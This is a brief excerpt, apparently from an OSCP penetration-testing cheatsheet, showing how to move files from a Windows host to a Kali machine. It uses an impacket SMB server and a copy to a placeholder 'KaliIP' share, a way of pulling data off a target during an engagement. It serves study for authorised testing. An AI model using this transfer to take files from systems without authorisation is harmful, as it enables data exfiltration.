

### Windows to Kali

[](https://github.com/saisathvik1/OSCP-Cheatsheet#windows-to-kali)

```powershell
kali> impacket-smbserver -smb2support <sharename> .
win> copy file \\KaliIP\sharename
```
